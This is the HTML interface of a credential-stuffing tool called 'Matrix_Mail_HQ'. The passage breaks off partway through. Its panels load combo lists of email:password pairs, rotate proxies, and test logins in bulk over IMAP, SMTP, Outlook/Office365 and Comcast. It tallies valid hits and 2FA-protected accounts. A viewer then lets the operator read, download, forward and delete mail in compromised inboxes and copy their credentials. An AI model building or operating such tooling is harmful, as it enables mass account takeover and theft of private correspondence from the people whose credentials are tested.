    <div class="bat bat-9"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="#00d4ff" opacity="0.5"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.2"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="#00d4ff" opacity="0.5"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.2"/><ellipse cx="50" cy="22" rx="4" ry="6" fill="#00d4ff" opacity="0.6"/><ellipse cx="50" cy="15" rx="2.5" ry="2.5" fill="#00d4ff" opacity="0.6"/><polygon points="48,13.5 45.5,9 46,12" fill="#00d4ff" opacity="0.6"/><polygon points="52,13.5 54.5,9 54,12" fill="#00d4ff" opacity="0.6"/><path d="M47.5 27.5 Q45.5 33 48.5 35 L50 30 Z" fill="#00d4ff" opacity="0.3"/><path d="M52.5 27.5 Q54.5 33 51.5 35 L50 30 Z" fill="#00d4ff" opacity="0.3"/></svg></div>
    <div class="bat bat-10"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="var(--accent)" opacity="0.7"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.3"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="var(--accent)" opacity="0.7"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.3"/><ellipse cx="50" cy="22" rx="5.5" ry="7.5" fill="var(--accent)" opacity="0.8"/><ellipse cx="50" cy="14" rx="3.5" ry="3.5" fill="var(--accent)" opacity="0.8"/><polygon points="48,12 44.5,7 46,11" fill="var(--accent)" opacity="0.8"/><polygon points="52,12 55.5,7 54,11" fill="var(--accent)" opacity="0.8"/><path d="M46.5 28.5 Q44 35.5 48 37 L50 30 Z" fill="var(--accent)" opacity="0.5"/><path d="M53.5 28.5 Q56 35.5 52 37 L50 30 Z" fill="var(--accent)" opacity="0.5"/></svg></div>
    <div class="bat bat-11"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="#00d4ff" opacity="0.65"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.3"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="#00d4ff" opacity="0.65"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.3"/><ellipse cx="50" cy="22" rx="5" ry="7" fill="#00d4ff" opacity="0.75"/><ellipse cx="50" cy="14" rx="3.5" ry="3.5" fill="#00d4ff" opacity="0.75"/><polygon points="48,12 44.5,7 46,11" fill="#00d4ff" opacity="0.75"/><polygon points="52,12 55.5,7 54,11" fill="#00d4ff" opacity="0.75"/><path d="M46.5 28.5 Q44 35 48 37 L50 30 Z" fill="#00d4ff" opacity="0.45"/><path d="M53.5 28.5 Q56 35 52 37 L50 30 Z" fill="#00d4ff" opacity="0.45"/></svg></div>
    <div class="bat bat-12"><svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg"><path d="M50 18 L48 10 L40 4 L28 0 L14 2 L4 6 L0 12 L4 16 L12 12 L18 14 L22 12 L28 14 L34 12 L40 14 L44 12 L48 15 Z" fill="var(--accent)" opacity="0.6"/><path d="M50 18 L46 12 L36 6 L22 2 L12 4 L4 8 L6 12 L12 10 L18 12 L22 10 L28 12 L34 10 L38 12 L44 11 L48 14 Z" fill="#000" opacity="0.25"/><path d="M50 18 L52 10 L60 4 L72 0 L86 2 L96 6 L100 12 L96 16 L88 12 L82 14 L78 12 L72 14 L66 12 L60 14 L56 12 L52 15 Z" fill="var(--accent)" opacity="0.6"/><path d="M50 18 L54 12 L64 6 L78 2 L88 4 L96 8 L94 12 L88 10 L82 12 L78 10 L72 12 L66 10 L62 12 L56 11 L52 14 Z" fill="#000" opacity="0.25"/><ellipse cx="50" cy="22" rx="5" ry="7" fill="var(--accent)" opacity="0.7"/><ellipse cx="50" cy="14" rx="3.5" ry="3.5" fill="var(--accent)" opacity="0.7"/><polygon points="48,12 44.5,7 46,11" fill="var(--accent)" opacity="0.7"/><polygon points="52,12 55.5,7 54,11" fill="var(--accent)" opacity="0.7"/><path d="M46.5 28.5 Q44 35 48 37 L50 30 Z" fill="var(--accent)" opacity="0.4"/><path d="M53.5 28.5 Q56 35 52 37 L50 30 Z" fill="var(--accent)" opacity="0.4"/></svg></div>
    <!-- Logo & Content (above bats) -->
    <div style="position:relative; z-index:10; display:flex; flex-direction:column; align-items:center;">
        <div class="splash-logo"></div>
        <h1 class="accent-glow-text" style="margin-top:32px; letter-spacing:6px; font-weight:800; font-size:2rem;">MATRIX_HQ</h1>
        <div style="font-size:0.75rem; color:var(--text-muted); margin-top:8px; letter-spacing:3px; text-transform:uppercase;">@Hamzatostospospos</div>
        <div class="loader-bar"><div class="loader-fill"></div></div>
        <div style="color:var(--text-muted); font-size:0.65rem; margin-top:12px; letter-spacing:2px;">OMEGA CORE INITIALIZING</div>
    </div>
</div>

<div class="sidebar">
    <button onclick="document.querySelector('.sidebar').classList.remove('sidebar-open')" id="mobile-close-btn" style="display:none; position:absolute; top:12px; right:12px; background:transparent; border:none; color:#fff; font-size:1.5rem; cursor:pointer; z-index:1005;">✖</button>
    <div class="logo-area">
        <div class="logo-icon" style="background: transparent; box-shadow: none;"><img src="logo.jpg" style="width: 100%; height: 100%; object-fit: contain; filter: drop-shadow(0 4px 16px var(--accent-glow));" /></div>
        <div>
            <div class="logo-text">Matrix_Mail_HQ</div>
            <div class="logo-sub">V12.2 OMEGA</div>
        </div>
    </div>
    <div class="nav-section-label">MAIN</div>

    <div class="nav-item active" onclick="sh('dash',this)" id="nav-scan">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"/><path d="m9 12 2 2 4-4"/></svg>
        <span id="nav-scan-text">SCANNER</span>
    </div>
    <div class="nav-item" onclick="sh('acc_tab',this); loadH()" id="nav-acc">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
        <span id="nav-acc-text">ACCOUNTS</span>
    </div>
    <div class="nav-item" onclick="sh('manual',this)" id="nav-man">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><line x1="19" x2="19" y1="8" y2="14"/><line x1="22" x2="16" y1="11" y2="11"/></svg>
        <span id="nav-man-text">MANUAL</span>
    </div>
    <div class="nav-item" onclick="sh('view',this)" id="nav-view">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
        <span id="nav-view-text">VIEWER</span>
    </div>

    <div class="nav-section-label">TOOLS</div>
    <div class="nav-item" onclick="sh('search_tab',this)" id="nav-search-global">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
        <span id="nav-search-text-global">SEARCH ALL</span>
    </div>
    <div class="nav-item" onclick="sh('extract_tab',this)" id="nav-extract">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="3" y2="15"/></svg>
        <span id="nav-extract-text">EXTRACTORS</span>
    </div>
    <div class="nav-item" onclick="sh('outlook_tab',this)" id="nav-outlook">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 17a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2H2a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h20Z"/><path d="M0 9l12 4 12-4"/></svg>
        <span id="nav-outlook-text">OUTLOOK CHK</span>
    </div>
    <div class="nav-item" onclick="sh('comcast_tab',this)" id="nav-comcast">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 22"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
        <span id="nav-comcast-text">COMCAST CHK</span>
    </div>
    <div class="nav-item" onclick="sh('settings_tab',this); loadSettings()" id="nav-settings">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.1a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg>
        <span id="nav-settings-text">SETTINGS</span>
    </div>
    <div class="nav-item" onclick="sh('hist',this); loadHist()" id="nav-hist">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 8v4l3 3"/><circle cx="12" cy="12" r="10"/></svg>
        <span id="nav-hist-text">HISTORY</span>
    </div>
    
    <div class="sidebar-footer">
        <div style="color:var(--accent); font-weight:800;">@Hamzatostospospos</div>
        <div style="color:var(--text-muted); margin-top:4px;">V12.2 OMEGA</div>
    </div>
</div>


<div class="content">
    <div class="header">
        <div style="display:flex; align-items:center; gap:24px;">
            <div style="display:flex; gap:8px; align-items:center;">
                <button id="mobile-menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('sidebar-open')" style="display:none; background:transparent; border:none; color:var(--text-primary); cursor:pointer; margin-right:8px; padding:4px;">
                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
                </button>
                <button class="btn btn-danger" onclick="clearResults()" style="padding:6px 16px; font-size:0.7rem; letter-spacing:1px; border-radius:99px; margin-right:12px;">CLEAR ALL TABS</button>
                <select id="lang-select" style="background:var(--bg-card); color:var(--text-primary); border:1px solid var(--border); padding:4px 8px; border-radius:6px; font-size:0.75rem;" onchange="setLang(this.value)">
                    <option value="EN">🇺🇸 EN</option>
                    <option value="AR">🇩🇿 AR</option>
                    <option value="FR">🇫🇷 FR</option>
                    <option value="CN">🇨🇳 CN</option>
                    <option value="RU">🇷🇺 RU</option>
                    <option value="ES">🇪🇸 ES</option>
                </select>
            </div>
        </div>
        <div class="stats-group">
            <div class="stat-pill">
                <span style="color:var(--text-secondary)">DISC</span>
                <span id="s_db" style="color:var(--accent)">0/0</span>
            </div>
            <div class="stat-pill">
                <span style="color:var(--text-secondary)">IMAP</span>
                <span id="s_ch" style="color:var(--text-primary)">0</span> | <span id="s_vi" style="color:var(--accent)">0</span>
            </div>
            <div class="stat-pill">
                <span style="color:var(--text-secondary)">SMTP</span>
                <span id="s_smtp_ch" style="color:var(--text-primary)">0</span> | <span id="s_smtp_vi" style="color:var(--accent)">0</span>
            </div>
            <div class="stat-pill" style="border-color:var(--accent)">
                <span style="color:var(--text-secondary)">OUTLOOK</span>
                <span id="s_out_ch" style="color:var(--text-primary)" title="Checked">0</span> | <span id="s_out_vi" style="color:var(--accent)" title="Hits (Valid)">0</span> | <span id="s_out_cu" style="color:var(--success)" title="Custom (Keywords)">0</span>
            </div>
            <div class="stat-pill" style="border-color:var(--accent)">
                <span style="color:var(--text-secondary)">SENT</span>
                <span id="s_sent" style="color:var(--accent)">0</span>
            </div>
            <div class="stat-pill" style="border-color:var(--danger)">
                <span style="color:var(--text-secondary)">FAIL</span>
                <span id="s_fail" style="color:var(--danger)">0</span>
            </div>
            <div class="stat-pill" style="border-color:#ffb800">
                <span style="color:var(--text-secondary)">2FA</span>
                <span id="s_2fa" style="color:#ffb800">0</span>
            </div>
            <div class="stat-pill" style="border-color:#8b5cf6">
                <span style="color:var(--text-secondary)">MULTI-PASS</span>
                <span id="s_multi" style="color:#8b5cf6">0</span>
            </div>

        </div>
    </div>

    <!-- Dash / Scanner -->
    <div id="dash" class="v-container active">
        <div class="glass-card">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px;">
                <h2 id="title-mass-discovery" style="margin:0; font-size:1.5rem; font-weight:800;">Mass Discovery Engine</h2>
                <div style="display:flex; gap:12px;">
                    <div style="width:100px;">
                        <label id="lbl-threads" style="font-size:0.7rem; color:var(--text-secondary); display:block; margin-bottom:4px;">THREADS</label>
                        <input type="number" id="threads" value="100">
                    </div>
                </div>
            </div>
            <div style="display:grid; grid-template-columns: 1fr; gap:24px; margin-bottom:24px;">
                <div>
                    <label id="lbl-combos" style="font-size:0.7rem; color:var(--text-secondary); display:block; margin-bottom:8px;">COMBO LIST (USER:PASS)</label>
                    <div style="display:flex; gap:8px; margin-bottom:10px;">
                        <input type="text" id="combo_file_path" placeholder="OR LOAD FROM FILE (Full path to combos.txt)" style="margin-bottom:0; border-color:var(--accent);">
                        <button class="btn btn-secondary" style="flex-shrink:0; width:100px; padding:0 8px;" onclick="browseLocalFile('combo_file_path')" id="btn-combo-browse">BROWSE</button>
                    </div>
                    <textarea id="combos" style="height:350px; resize:none;" placeholder="example@domain.com:password123"></textarea>
                </div>
            </div>
            <div style="margin-bottom:20px;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
                    <label style="font-size:0.7rem; color:var(--text-secondary); font-weight:700; letter-spacing:1px;">🔒 PROXIES POOL <span style="color:#888; font-weight:400;">(SOCKS5/SOCKS4/HTTP — Optional)</span></label>
                    <div style="display:flex; align-items:center; gap:8px;">
                        <span id="scanner_proxy_count" style="font-size:0.65rem; color:var(--accent); font-weight:700; background:rgba(0,255,163,0.1); padding:2px 8px; border-radius:20px;">0 proxies</span>
                        <button type="button" class="btn btn-secondary" onclick="browseLocalFile('scanner_proxies')" style="padding:3px 10px; font-size:0.65rem;">📂 Load File</button>
                    </div>
                </div>
                <textarea id="scanner_proxies" style="height:80px; resize:none; font-size:0.72rem;" placeholder="socks5://1.2.3.4:1080&#10;socks5://user:pass@host:port  (residential)&#10;host:port:user:pass&#10;http://proxy.com:3128" oninput="document.getElementById('scanner_proxy_count').textContent=(this.value.trim()?this.value.trim().split(/\n/).filter(l=>l.trim()).length:0)+' proxies'"></textarea>
            </div>
            <div style="display:flex; gap:16px; justify-content:flex-end;">
                <button class="btn btn-secondary" onclick="startD()" id="btn-scan-d">Discover Domains</button>
                <button class="btn btn-secondary" onclick="clearD()" id="btn-clear-dash">Clear</button>
                <button class="btn btn-primary" onclick="startS()" id="btn-start">Start Checker</button>
                <button class="btn btn-danger" onclick="abortS()" id="btn-stop">Stop Engine</button>
                <button class="btn btn-secondary" onclick="clearResults()" id="btn-clear-session" style="background:var(--danger); border:none; color:#fff;">Clear Session</button>
            </div>
            <div id="live" style="margin-top:24px; height:150px; overflow-y:auto; background:#000; padding:16px; border-radius:12px; border:1px solid var(--border); font-family:'JetBrains Mono', monospace; font-size:0.8rem; color:var(--accent);"></div>
        </div>

        <!-- Country & Keyword Distribution Charts -->
        <div class="chart-grid">
            <!-- Country Distribution -->
            <div class="chart-card">
                <div class="chart-card-title">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>
                    Country Distribution
                </div>
                <div class="chart-canvas-wrap">
                    <canvas id="countryChart" width="220" height="220"></canvas>
                    <div class="chart-center-label">
                        <div class="chart-total" id="countryTotal">0</div>
                        <div class="chart-total-sub">Countries</div>
                    </div>
                    <div class="chart-tooltip" id="countryTooltip"></div>
                </div>
                <div class="chart-legend" id="countryLegend"></div>
            </div>

            <!-- Keyword Distribution -->
            <div class="chart-card">
                <div class="chart-card-title">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
                    Keyword Distribution
                </div>
                <div class="chart-canvas-wrap">
                    <canvas id="keywordChart" width="220" height="220"></canvas>
                    <div class="chart-center-label">
                        <div class="chart-total" id="keywordTotal">0</div>
                        <div class="chart-total-sub">Domains</div>
                    </div>
                    <div class="chart-tooltip" id="keywordTooltip"></div>
                </div>
                <div class="chart-legend" id="keywordLegend"></div>
            </div>
        </div>
    </div>

    <!-- Manual -->
    <div id="manual" class="v-container">
        <div class="glass-card" style="max-width:600px; margin: 0 auto;">
            <h2 id="title-manual" style="margin-bottom:24px; font-weight:800;">Single Connection</h2>
            <div style="margin-bottom:20px;">
                <label id="lbl-target-combo" style="font-size:0.7rem; color:var(--text-secondary); display:block; margin-bottom:8px;">TARGET COMBO</label>
                <input type="text" id="m_c" placeholder="email:password">
            </div>
            <button class="btn btn-primary" onclick="mLogin()" id="btn-manual-connect" style="width:100%;">Connect & View Inbox</button>
            <div id="m_st" style="margin-top:20px; text-align:center; font-weight:700; font-size:0.9rem;"></div>
        </div>
    </div>

    <!-- Accounts -->
    <div id="acc_tab" class="v-container">
        <div class="glass-card">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; gap:24px;">
                <h2 id="title-validated" style="margin:0; font-weight:800; white-space:nowrap;">Validated Accounts</h2>
                <div style="flex:1; max-width:400px;">
                    <input type="text" id="acc_search" placeholder="Search emails (press Enter)..." onkeyup="if(event.key==='Enter') loadH(1)" style="padding:10px 18px; font-size:0.85rem;">
                </div>
                <div style="display:flex; gap:8px;">
                    <button class="btn btn-secondary" onclick="loadH(curPH-1)" id="btn-acc-prev">PREV</button>
                    <div class="stat-pill" id="v-hp">1</div>
                    <button class="btn btn-secondary" onclick="loadH(curPH+1)" id="btn-acc-next">NEXT</button>
                </div>
            </div>
            <div id="hits-list" style="display:grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap:16px;"></div>
        </div>
    </div>

    <!-- Viewer -->
    <div id="view" class="v-container" style="padding:0; flex:1; height: calc(100vh - 120px);">
        <div style="padding:12px 24px; background:var(--bg-card); border-bottom:1px solid var(--border); display:flex; align-items:center; gap:16px; justify-content:space-between;">
            <div style="display:flex; align-items:center; gap:16px;">
                <div style="width:12px; height:12px; border-radius:50%; background:var(--accent); box-shadow:0 0 10px var(--accent-glow);"></div>
                <div id="lbl-target-session" style="font-size:0.75rem; color:var(--text-secondary); font-weight:700; text-transform:uppercase; letter-spacing:1px;">Target Session:</div>
                <div id="v-cur-hit" style="font-family:'JetBrains Mono', monospace; font-size:0.85rem; color:var(--accent); font-weight:700;">No Account Selected</div>
            </div>
            <button class="btn btn-secondary" onclick="if(curH) { navigator.clipboard.writeText(curH); showNotify('Credentials Copied!', 'success'); } else { showNotify('No account selected!', 'error'); }" style="padding:4px 10px; font-size:0.7rem;">Copy Credentials</button>
        </div>
        <div class="mail-viewer">
            <div class="folder-list" id="folder-list">
                <div id="lbl-select-account" style="padding:10px; color:var(--text-secondary); font-size:0.8rem;">Select Account First</div>
            </div>
            
            <div class="mail-list">
                <div style="padding:16px; border-bottom:1px solid var(--border); display:flex; flex-direction:column; gap:12px;">
                    <div style="display:flex; gap:8px;">
                        <input type="text" id="v-search" placeholder="Search Subject..." style="font-size:0.8rem; padding:8px; flex:1;">
                        <button class="btn btn-primary" onclick="loadM(curF)" style="padding:8px 12px;" title="Search">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
                        </button>
                        <button class="btn btn-secondary" onclick="loadM(curF)" style="padding:8px 12px; display:flex; align-items:center; gap:6px;" title="Refresh Inbox">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-dasharray="none" stroke-width="2" fill="none"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67" stroke="currentColor"/></svg>
                            <span style="font-size:0.75rem; font-weight:700;">Refresh</span>
                        </button>
                    </div>
                    <div style="display:flex; justify-content:space-between; align-items:center; gap:8px; flex-wrap:wrap;">
                        <div style="display:flex; gap:8px; align-items:center;">
                            <input type="checkbox" id="sel-all" onclick="toggleAllMsgs()" style="width:18px; height:18px; cursor:pointer;">
                            <button class="btn btn-secondary" style="padding:4px 8px; font-size:0.65rem;" onclick="downloadAllChecked()" id="btn-view-batch">Download Batch</button>
                        </div>
                        <div style="display:flex; gap:4px; align-items:center;">
                            <span style="font-size:0.65rem; color:var(--text-secondary); text-transform:uppercase; font-weight:700;">Sort:</span>
                            <select id="v-sort" onchange="renderCurrentMessages()" style="background:#000; color:#fff; border:1px solid var(--border); padding:4px 6px; border-radius:6px; font-size:0.7rem; cursor:pointer;">
                                <option value="date-desc" selected>New to Old</option>
                                <option value="date-asc">Old to New</option>
                                <option value="sender-asc">Sender (A-Z)</option>
                                <option value="sender-desc">Sender (Z-A)</option>
                                <option value="subject-asc">Subject (A-Z)</option>
                            </select>
                        </div>
                    </div>
                </div>
                <div id="msgs-list" style="flex:1; overflow-y:auto; background: var(--bg-card);"></div>
                <div style="padding:16px; border-top:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; background:var(--bg-sidebar);">
                    <div style="display:flex; gap:8px;">
                        <button class="btn btn-secondary" style="padding:6px 10px;" onclick="loadM(curF,null,curP-1)" id="btn-view-prev">Prev</button>
                        <button class="btn btn-secondary" style="padding:6px 10px;" onclick="loadM(curF,null,curP+1)" id="btn-view-next">Next</button>
                    </div>
                    <select id="v-ps" style="background:#000; color:#fff; border:1px solid var(--border); padding:4px; border-radius:6px; font-size:0.75rem;" onchange="loadM(curF)">
                        <option>20</option><option selected>50</option><option>100</option>
                    </select>
                </div>
            </div>
            <div style="display:flex; flex-direction:column; background:#050505;">
                <div id="v-body-head" style="padding:16px 24px; border-bottom:1px solid var(--border); background:var(--bg-card); display:none; justify-content:space-between; align-items:center; gap:20px; overflow:hidden;">
                    <div id="v-body-meta" style="font-weight:600; font-size:0.9rem; color:var(--text-primary); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; flex:1; min-width:0;"></div>
                    <div style="display:flex; gap:12px; flex-shrink:0;">
                         <button class="btn btn-secondary" onclick="toggleMode()" id="btn-toggle-type">HTML/TEXT</button>
                         <button class="btn btn-secondary" onclick="fwdM()" id="btn-view-fwd">FORWARD</button>
                         <button class="btn btn-danger" onclick="delM()" id="btn-view-del">DELETE</button>
                         <button class="btn btn-primary" onclick="downloadViewed()" id="btn-view-down">DOWNLOAD</button>
                    </div>
                </div>
                <div id="body-view" style="flex:1; background:#fff; color:#000;">
                    <div id="lbl-select-msg" style="height:100%; display:flex; align-items:center; justify-content:center; color:#666; font-style:italic;">
                        Select a message to display the content
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- History -->
    <div id="hist" class="v-container">
        <div class="glass-card">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px;">
                <h2 id="hist-title" style="margin:0; font-weight:800;">Hits History</h2>
                <button class="btn btn-danger" onclick="clearFullDatabase()" id="btn-clear-db">CLEAR DATABASE</button>
            </div>
            <div id="h-list" style="font-family:'JetBrains Mono', monospace; font-size:0.85rem; color:var(--text-secondary);"></div>
        </div>
    </div>


    <!-- OFFICE365 CHECKER -->
    <div id="office365_tab" class="v-container">
        <div class="glass-card">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px;">
                <h2 id="title-office" style="margin:0; font-size:1.5rem; font-weight:800;">Office365/Outlook Checker</h2>
                <div style="display:flex; align-items:center; gap:16px;">
                    <div style="text-align:right; font-size:0.8rem;">
                        <div id="lbl-status-office" style="color:var(--text-secondary); margin-bottom:4px;">Status</div>
                        <div style="font-weight:800; color:var(--accent);">
                            <span id="office365_status">IDLE</span>
                        </div>
                    </div>
                </div>
            </div>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:24px; margin-bottom:24px;">
                <div>
                    <label id="lbl-office-combos" style="font-size:0.7rem; color:var(--text-secondary); display:block; margin-bottom:8px;">OFFICE365 ACCOUNTS (EMAIL:PASSWORD)</label>
                    <textarea id="office365_combos" style="height:250px; resize:none;" placeholder="user@outlook.com:password&#10;user@hotmail.com:password&#10;user@office365.com:password"></textarea>
                </div>
                <div style="display:flex; flex-direction:column; gap:16px;">
                    <div style="background:rgba(100,150,255,0.05); padding:16px; border-radius:12px; border:1px dashed #6496ff;">
                        <div id="lbl-office-title" style="font-size:0.75rem; color:#6496ff; font-weight:800; margin-bottom:4px;">⚡ OFFICE365 CHECKER</div>
                        <div id="lbl-office-desc" style="font-size:0.7rem; color:var(--text-secondary);">Supports:
                        <br/>• outlook.com
                        <br/>• hotmail.com
                        <br/>• live.com
                        <br/>• office365.com
                        <br/><br/>Tests: smtp.office365.com, smtp-mail.outlook.com
                        </div>
                    </div>
                    <div style="display:flex; flex-direction:column; gap:8px;">
                        <div>
                            <label id="lbl-office-timeout" style="font-size:0.7rem; color:var(--text-secondary);">Timeout (seconds)</label>
                            <input type="number" id="office365_timeout" value="10" min="5" max="60">
                        </div>
                    </div>
                </div>
            </div>
            <div style="display:flex; gap:16px; justify-content:flex-end; align-items:center;">
                <div id="office365_progress" style="display:none; color:var(--accent); font-weight:700; font-size:0.8rem; margin-right:auto;">
                    <span class="dot-blink" style="background:var(--accent); width:8px; height:8px; border-radius:50%; display:inline-block; margin-right:8px;"></span>
                    CHECKING: <span id="office365_checked">0</span> | <span style="color:#00ff63;">LIVE: <span id="office365_live_count">0</span></span>
                </div>
                <button class="btn btn-secondary" onclick="clearOffice365Results()" id="btn-office-clear">Clear</button>
                <button class="btn btn-primary" onclick="startOffice365Checker()" id="btn-office-start">Start Office365 Checker</button>
                <button class="btn btn-danger" onclick="stopOffice365Checker()" id="btn-office-stop">Stop</button>
            </div>
            <div id="office365_results" style="margin-top:24px; height:250px; overflow-y:auto; background:#000; padding:16px; border-radius:12px; border:1px solid var(--border); font-family:'JetBrains Mono', monospace; font-size:0.75rem; color:var(--accent);">Ready to check...</div>
        </div>
    </div>

    <!-- COMCAST CHECKER -->
    <div id="comcast_tab" class="v-container">
        <div class="glass-card">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px;">
                <h2 id="title-comcast" style="margin:0; font-size:1.5rem; font-weight:800;">Comcast Checker</h2>
                <div style="display:flex; align-items:center; gap:16px;">
                    <div style="text-align:right; font-size:0.8rem;">
                        <div id="lbl-status-comcast" style="color:var(--text-secondary); margin-bottom:4px;">Status</div>
